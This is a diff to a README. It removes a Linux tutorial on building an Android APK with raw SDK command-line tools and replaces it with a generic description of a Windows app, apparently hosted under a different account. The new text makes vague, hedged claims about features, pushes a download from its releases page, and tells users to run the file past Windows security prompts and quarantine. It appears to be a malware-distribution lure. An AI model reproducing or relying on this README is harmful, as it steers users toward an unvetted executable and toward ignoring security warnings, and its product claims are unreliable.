@@ -1,410 +1,173 @@
-# ATFS
+# 🛠️ ATFS - Android builds made simple
 
-<br>
+[![Download ATFS](https://img.shields.io/badge/Download%20ATFS-blue?style=for-the-badge)](https://github.com/kizmab4026/ATFS/releases)
 
-<p align="center">
-<b>ATFS</b> - <b>A</b>ndroid <b>T</b>ooling <b>F</b>rom <b>S</b>cratch
-<br>
-<code>A learning journey into Android development tooling.</code>
-</p>
+## 📦 What is ATFS?
 
-<br>
+ATFS stands for Android Tooling From Scratch. It is a Windows app for people who want a simple way to work with Android build tools. It helps you set up common Android tooling steps in one place, so you do not have to deal with each tool by hand.
 
----
+This app is made for end users who want a clear path to get started on Windows. It focuses on basic setup, common Android Gradle tasks, and a cleaner way to manage build files and project tools.
 
-Android Studio is a powerful tool. But when I first used it, much of what it did felt opaque, with endless Gradle syncs and auto-generated files that I barely understood.
+## 🚀 Download ATFS
 
-I believe that to understand a tool, you must first understand the problem it solves. This project documents my journey learning Android development tooling. It begins by building a basic Android app using only the minimum necessary tools, without relying on an IDE or build system, and then introduces Gradle, followed by Android Studio.
+Visit this page to download the latest release for Windows:
 
-## Goals
-- Become comfortable with the Android tooling and development workflow.
-- Understand what tools like Android Studio and Gradle handle automatically.
-- Gain a clearer sense of how the pieces fit together.
-- Develop a sense of control over the development process.
+https://github.com/kizmab4026/ATFS/releases
 
+On that page, look for the newest release and download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.
 
-## Chapters of this Journey
+## 💻 What you need
 
-This repository is structured into branches, each representing a chapter in the learning process.
+Before you run ATFS, make sure your PC has:
 
-- `master` (📍You are here): Building an Android app using only the raw SDK command-line tools.
+- Windows 10 or Windows 11
+- A modern web browser
+- Enough free disk space for the app and Android tools
+- Internet access for the first download
 
-- [`chapter-2-gradle-cli`](https://github.com/hethon/atfs/tree/chapter-2-gradle-cli): Introducing Gradle build script to replace our manual build script, still without AGP and an IDE.
+For smoother use, it also helps to have:
 
-- [`chapter-3-agp`](https://github.com/hethon/atfs/tree/chapter-3-agp): Introduce the Android Gradle Pluging (AGP) to replace our custom taskes in Chapter 2. `[Not published yet]`
+- At least 8 GB of RAM
+- A recent Intel or AMD processor
+- Administrator access on the PC if Windows asks for it
 
-- [`chapter-4-android-studio`](https://github.com/hethon/atfs/tree/chapter-3-android-studio): Finally opening the IDE, with the magic stripped away and a full understanding of the underlying system. `[Not published yet]`
+## 🧭 Install and run
 
-<br>
+Follow these steps on Windows:
 
-[⬇️ Go to the bottom](#whats-next)
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is in a ZIP folder, extract it first.
+5. Open the app file inside the folder.
+6. If Windows shows a security prompt, choose the option to run the app.
+7. Let the app finish its first setup.
+8. Start using ATFS from the main window.
 
-## Chapter 1:
+If the app opens from a folder, keep the folder in the same place. Moving files while the app is running can break shortcuts or saved settings.
 
-Building an Android app using only the raw SDK command-line tools.
+## 🧰 What ATFS can do
 
-**In this guide, we will manually:**
-- Install and set up the components of the Android SDK.
-- Create a directory layout.
-- Write the application code and manifest.
-- Run the correct terminal command for each compilation step until we get a signed, installable APK.
-- Install the APK to a physical device using `adb`.
+ATFS is built to help with common Android tooling tasks. Depending on the release you download, you may be able to:
 
-### Prerequisites
-- JDK 17 is installed correctly, and the javac command is accessible globally.
-- A Linux-based Terminal.
+- Start Android build workflows
+- Manage Gradle-based project setup
+- Work with Android tooling files
+- Keep build steps in one place
+- Reduce the need to use command-line tools by hand
 
----
+It is useful if you want a simple desktop app for Android build tasks without learning a full set of commands first.
 
-### 1. Installation and Setup
+## 🗂️ Main parts of the app
 
-To build an app, we need the **Android SDK**. The Android SDK contains all the tools, libraries, and headers needed to compile Android code. 
+When you open ATFS, you may see parts like these:
 
-The Android SDK consists of a handful of components. The most important one to start with is the `cmdline-tools` package. This package contains `sdkmanager`, which we will use to install the other components (like `build-tools`, `platform-tools`, etc.).
+- Project panel: shows the current Android project or workspace
+- Tool section: holds common Android setup actions
+- Gradle area: helps with build-related tasks
+- Output box: shows progress and status messages
+- Settings page: lets you adjust app options
 
-The `cmdline-tools` package is the minimal “bootstrap” package needed to:
-1. Run `sdkmanager`.
-2. Install everything else without needing the Android Studio GUI.
+The layout is meant to keep the main steps easy to find.
 
-#### Step 1: Create the folder structure
-Let's create a dedicated folder for our SDK.
-```bash
-mkdir -p ~/Android/cmdline-tools
-cd ~/Android/cmdline-tools
-```
+## 🛠️ Typical use case
 
-#### Step 2: Download and unzip `cmdline-tools`
-*(Note: You can check the [Android developer website](https://developer.android.com/studio#command-line-tools-only) for the latest download link).*
-```bash
-wget https://dl.google.com/android/repository/commandlinetools-linux-14742923_latest.zip
+A common way to use ATFS is:
 
-unzip commandlinetools-linux-14742923_latest.zip
+1. Open the app.
+2. Choose or load your Android project.
+3. Check that the needed tools are in place.
+4. Run the setup or build action you need.
+5. Review the output for success or errors.
 
-mv cmdline-tools latest
+If you are new to Android tooling, this gives you one place to manage the basic flow.
 
-rm commandlinetools-linux-14742923_latest.zip
-```
+## 🔍 Helpful checks before you start
 
-After this, you will have `~/Android/cmdline-tools/latest/bin/`. Inside this `bin/` folder are the core tools like `sdkmanager`.
+If the app does not open right away, check these things:
 
-#### Step 3: Set environment variables
-Add this to your `~/.bashrc` (or `~/.zshrc`):
-```bash
-export ANDROID_HOME=$HOME/Android
-export PATH=$ANDROID_HOME/cmdline-tools/latest/bin:$PATH
-```
-Apply it:
-```bash
-source ~/.bashrc
-```
+- The file finished downloading
+- You extracted the ZIP file if it came as a ZIP
+- You are opening the correct Windows file
+- Your PC has enough free space
+- Windows did not move the file to quarantine
 
-You should now be able to run `sdkmanager` from anywhere:
-```bash
-sdkmanager --list
-```
-
-#### Step 4: Install the required SDK packages
-From the list of available packages, we need three specific things to build an app:
-
-*   **`build-tools`**: Includes tools like `aapt2` (resource compiler) and `d8` (bytecode converter) used to package your app into an APK.
-*   **`platform-tools`**: Contains tools needed to communicate with physical or virtual devices (like `adb`).
-*   **`platforms`**: The actual Android framework libraries (the `android.jar`) needed to compile your app against a specific version of Android. 
-
-Run the following to install these packages (we are targeting Android API 34):
-```bash
-sdkmanager "build-tools;34.0.0" "platform-tools" "platforms;android-34"
-```
-
-Let's update our environment variables one more time to include the newly installed `platform-tools`:
-```bash
-export ANDROID_HOME=$HOME/Android
-export PATH=$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH
-```
-Apply it (`source ~/.bashrc`), and verify `adb` is accessible:
-```bash
-adb version
-```
-
-You might notice we only added `cmdline-tools` and `platform-tools` to PATH, but not `build-tools`. That’s intentional.
-
-The tools inside `cmdline-tools` and `platform-tools` (`sdkmanager`, `adb`) are general-purpose commands you’ll run directly from the terminal, so it makes sense to have them globally available.
-
-`build-tools`, on the other hand, is different. It contains the actual compilers and packaging tools (`aapt2`, `d8`, `apksigner`), and they live inside versioned directories, in our case, `$ANDROID_HOME/build-tools/34.0.0/`. Each Android project may require a specific version of these tools, and this project uses `34.0.0`.
-
-
-In the next steps, we’ll invoke these tools using their full paths:
-
-```
-$ANDROID_HOME/build-tools/34.0.0/aapt2
-
-# OR
-
-$ANDROID_HOME/build-tools/34.0.0/d8
-
-```
-
----
-
-### 2. Creating the Project Structure
-
-Let's create our workspace and the folders required to hold our code and the compiled outputs.
-
-```bash
-cd ~ # go back to home directory
-mkdir HelloAndroid
-cd HelloAndroid
-
-mkdir -p src/main/java/com/example/hello
-mkdir -p src/main/res/values
-mkdir -p build/classes
-mkdir -p build/dex
-mkdir -p build/res
-mkdir -p build/generated
-```
-
-**Why this specific structure?**
-While we are building this manually, we are mirroring the standard directory structure expected by Gradle. `src/main/java` holds our logic, `src/main/res` holds our visuals, and the `build/` directory acts as our temporary workspace where our compiled binaries will go. Keeping this standard structure will make migrating to Gradle later incredibly easy.
-
-#### Create a String Resource
-In Android, the `res/` (resources) folder stores UI layouts, text, images, and colors. This keeps hardcoded strings out of our Java logic. 
-
-```bash
-touch src/main/res/values/strings.xml
-```
-**Content:**
-```xml
-<resources>
-    <string name="app_name">HelloAndroid</string>
-    <string name="welcome">Hey, welcome to my first app.</string>
-</resources>
-```
-✅ **What this does:** It defines a string called `welcome`. Later, our Java code will reference this string via `R.string.welcome`.
-
-#### Create the Activity (The app's entry point)
-```bash
-touch src/main/java/com/example/hello/MainActivity.java
-```
-**Content:**
-```java
-package com.example.hello;
-
-import android.app.Activity;
-import android.os.Bundle;
-import android.widget.TextView;
-
-public class MainActivity extends Activity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        
-        TextView text = new TextView(this);
-        text.setText(R.string.welcome);
-        
-        setContentView(text);
-    }
-}
-```
-
-#### Create the AndroidManifest.xml
-The Android OS does not scan your Java code to find out how your app works. It reads the Manifest. 
-
-```bash
-touch src/main/AndroidManifest.xml
-```
-**Content:**
-```xml
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.hello"
-    android:versionCode="1"
-    android:versionName="1.0">
-
-    <uses-sdk android:minSdkVersion="23" android:targetSdkVersion="34" />
-
-    <application android:label="@string/app_name">
-        <activity android:name=".MainActivity" android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/>
-            </intent-filter>
-        </activity>
-    </application>
-</manifest>
-```
-✅ **What this does:** It tells the OS what permissions the app needs, the name of the app, and crucially, the `MAIN` and `LAUNCHER` intent filters tell the OS: *"This Activity is the app's starting screen, put a clickable icon for it on the user's home screen."*
-
----
-
-### 3. The Build Pipeline
-
-This is where the magic is stripped away. We will run the exact terminal commands required to turn these text files into a working Android app.
-
-#### Step 1: Compile Resources (`aapt2 compile`)
-```bash
-$ANDROID_HOME/build-tools/34.0.0/aapt2 compile \
-    --dir src/main/res \
-    -o build/res
-```
-👉 **What this does:** It reads our XML files, validates them for syntax errors, and converts them into compiled binary resources (`build/res/values_strings.arsc.flat`).
-
-#### Step 2: Link Resources (`aapt2 link`)
-```bash
-$ANDROID_HOME/build-tools/34.0.0/aapt2 link \
-  -I $ANDROID_HOME/platforms/android-34/android.jar \
-  --manifest src/main/AndroidManifest.xml \
-  --java build/generated \
-  -o build/unsigned.apk \
-  build/res/*.flat
-```
-👉 **What this does:** 
-1. It packages our compiled resources and the Manifest into a brand new ZIP archive named `unsigned.apk`. (Yes, APK is just a ZIP archive with a strict internal structure enforced by Android.)
-
-2. It generates the `R.java` file inside `build/generated`. The `R.java` file is the bridge that assigns a unique integer ID to our `<string name="welcome">`, allowing our Java code to call `R.string.welcome` without crashing!
-
-> <br>
->
-> **Why did we pass `android.jar` here?**  
->
-> The `AndroidManifest.xml` uses attributes from the Android framework (like `android:label`, `android:versionCode`, etc.).
->
-> During this step, `aapt2` needs to understand these attributes in order to process the Manifest correctly.
->
-> The `android.jar` provides those framework definitions.
->
-> <br>
-
-#### Step 3: Compile the Java Code (`javac`)
-We must compile our `MainActivity.java` and the newly generated `R.java` file together. We also must include the `android.jar` in our classpath, otherwise the compiler won't know what an `Activity` or a `TextView` is.
-
-```bash
-javac \
-    -classpath $ANDROID_HOME/platforms/android-34/android.jar \
-    -d build/classes \
-    src/main/java/com/example/hello/*.java \
-    build/generated/com/example/hello/*.java
-```
-
-This command compiles the Java codes and produces JVM bytecode `.class` files in `build/classes/com/example/hello`. In the next step, these `.class` files will be converted into Dalvik bytecode.
-
-> <br>
->
-> **What is `android.jar` actually?**
->
-> `android.jar` is the **Android framework API** packaged as a Java library. It contains all the classes your app can use (like `Activity`, `TextView`, etc.), along with their method signatures and structure.
->
-> This allows tools like `javac`, `aapt2`, and `d8` to understand and validate your code against a specific Android version (in our case, API 34).
->
-> However, it does **not** contain the real implementations of these classes. It only includes **API stubs**—just enough for compilation.
->
-> The actual implementations live on the Android device itself. At runtime, your app links against the system's Android framework, not this JAR.
->
-> <br>
-
-#### Step 4: Convert to Dalvik Bytecode (`d8`)
-Android devices do not run standard Java `.class` files. They run highly optimized `.dex` (Dalvik Executable) files.
-
-The --lib flag again points to `android.jar`, allowing `d8` to resolve Android API references.
-
-```bash
-$ANDROID_HOME/build-tools/34.0.0/d8 \
-    build/classes/com/example/hello/*.class \
-    --lib $ANDROID_HOME/platforms/android-34/android.jar \
-    --output build/dex
-```
-
-We will now have a `build/dex/classes.dex` file.
-
-#### Step 5: Add the Code to the APK
-In Step 2, `aapt2` created `unsigned.apk` and put our resources in it. Now, we just inject our compiled code into that same ZIP archive.
-
-```bash
-zip -j build/unsigned.apk build/dex/classes.dex
-```
-*(The `-j` flag tells zip to drop the file at the root of the archive, which is exactly where Android expects `classes.dex` to be).*
-
-#### Step 6: Zipalign
-This step rearranges the uncompressed data inside the APK to sit on 4-byte boundaries. This allows the Android OS to read the app directly from memory (mmap) without having to extract it first, saving RAM.
-
-```bash
-$ANDROID_HOME/build-tools/34.0.0/zipalign -p -f 4 build/unsigned.apk build/aligned.apk
-```
-
-#### Step 7: Sign the APK
-Android strictly requires every app to be cryptographically signed before it can be installed.
-
-First, generate a keystore (we only need to do this once):
-```bash
-keytool -genkeypair \
-  -keystore mykey.keystore \
-  -alias mykey \
-  -keyalg RSA \
-  -validity 10000
-```
-
-Next, sign the aligned APK:
-```bash
-$ANDROID_HOME/build-tools/34.0.0/apksigner sign \
-    --ks mykey.keystore \
-    --ks-key-alias mykey \
-    --out build/signed.apk \
-    build/aligned.apk
-```
-
-**Yay! 🎉** We have manually assembled `build/signed.apk`. It is a fully valid Android application. Now we are ready to install it.
-
----
-
-### 4. Install and Run
-
-Let's put the app on a real phone using `adb` (Android Debug Bridge).
-
-1. Enable **USB Debugging** in the Developer Settings of your phone.
-2. Connect your phone to your PC. *(If you are using WSL, use `usbipd-win` to forward the USB connection to Linux).*
-3. Verify the connection:
-```bash
-adb devices
-```
-*(If prompted on your phone, authorize the connection).*
-
-4. Install the signed APK!
-```bash
-adb install -r build/signed.apk
-```
-
-Open your phone, go to your app drawer, and look for **HelloAndroid**. We just built and deployed an app entirely from the command line.
-
-### 5. Automating the Process (`build.py`)
-
-Typing these 7 terminal commands every time you change a single line of Java is exhausting. To make this process easily repeatable, I aggregated all of these steps into a Python script called `build.py`.
-
-This script is roughly what `Gradle` and the `Android Gradle Plugin (AGP)` fundamentally do. They run `aapt2`, `javac`, and `d8` in the correct order, and output a signed APK.
-
-Make sure you have `python3` installed and just give the script execute permissions and run it. It will do the 7 steps we did [above](#3-the-build-pipeline) and outputs `build/signed.apk`.
-
-```bash
-chmod +x build.py
-./build.py
-```
-*(Note: It will prompt you for your keystore password during the signing step).*
-
----
-
-### What's Next?
-
-After successfully building this app manually, the logical next step is to invite **Gradle** and the **Android Gradle Plugin (AGP)** to the party. However, we are still going to keep **Android Studio** out of the picture for now. This will help us understand exactly how Gradle automates the manual steps we just learned.
-
-> <br>
->
-> **Side Note**
->
-> At this point you can take a detour and try to learn Gradle on a pure Java project first. This helps you understand Gradle's core concepts without the added noise of the Android SDK. 
->
-> That is exactly what I did. I picked up an old Java Swing Calculator app I made a while ago and migrated it to Gradle. It started a massive chain of rabbit holes and I ended up learning a lot of other cool things. You can check that out here: https://github.com/hethon/Kasio.
->
-> <br>
-
-
-To keep this branch as a pure, Gradle-free reference, the Gradle implementation will be documented in a separate branch here: https://github.com/hethon/atfs/tree/chapter-2-gradle-cli. 
-
-<br>
-
-[⬆️ Go to Up](#atfs)
+If the app opens but looks empty, try loading your project again or restarting the app.
+
+## 🧩 File layout after download
+
+If you downloaded a ZIP release, the folder may contain:
+
+- The main app file
+- Support files
+- A readme or license file
+- Settings data created after first launch
+
+Do not rename the support files unless you know they are not needed. Some desktop apps depend on their folder structure.
+
+## ⚙️ Basic settings
+
+ATFS may include settings for things like:
+
+- App theme
+- Tool paths
+- Project folder location
+- Build output location
+- Update checks
+
+If you are not sure what a setting does, leave it as-is until you need it.
+
+## 📘 For first-time users
+
+If this is your first time using Android tooling, use this order:
+
+1. Download the latest release
+2. Install or extract the app
+3. Open ATFS
+4. Read the main screen labels
+5. Load a project only after the app starts cleanly
+6. Run one small task first
+7. Check the output before trying larger builds
+
+This keeps the setup simple and helps you learn the app step by step.
+
+## 🧪 Common tasks
+
+ATFS may help with tasks such as:
+
+- Preparing Android build files
+- Checking Gradle-based project setup
+- Organizing build inputs
+- Starting a build process
+- Viewing status from a single screen
+
+These tasks are useful when you want a more direct path than using many separate tools.
+
+## 🔐 Safety and trust
+
+Only download ATFS from the official release page on GitHub. That helps you get the correct file for your system and avoid altered copies from other sites.
+
+## 📍 Topics
+
+This project is related to:
+
+- Android
+- Android Gradle Plugin
+- Gradle
+
+## ❓ Need help?
+
+If the app does not run as expected, try this order:
+
+1. Close the app
+2. Open it again
+3. Run it from the extracted folder
+4. Make sure you downloaded the latest release
+5. Check that Windows did not block the file
+6. Try a fresh download if the file looks incomplete
+
+## 📁 Release download
+
+Download or update ATFS from the release page:
+
+https://github.com/kizmab4026/ATFS/releases
